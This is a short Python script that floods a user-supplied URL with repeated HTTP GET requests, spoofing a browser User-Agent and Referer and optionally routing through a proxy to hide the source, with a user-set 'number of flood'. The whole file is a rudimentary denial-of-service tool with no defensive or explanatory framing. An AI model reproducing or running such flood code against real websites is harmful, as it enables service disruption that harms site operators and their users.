import requests as request
import sys

def ini(flood_max,http_url,proxy_ip,proxy_port):
    flood_max = int(flood_max)
    headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 GTB7.1 (.NET CLR 3.5.30729)", "Referer": "http://example.com"}
    count = 0

    if proxy_ip is not None and proxy_port is not None:
        proxy = {"http": proxy_ip + ':' + proxy_port}

    else:
        proxy = None
    
    while count < flood_max:
        if proxy is not None:
            r = request.get(http_url, headers=headers, proxies=proxy)
        else:
            r = request.get(http_url, headers=headers)
            print(count, r.status_code, r.url)
        count += 1

link=input('url: ')
ip = input('proxy ip: ')
port = input('proxy port: ')
flood = input('number of flood: ')
ini(flood,link,ip,port)


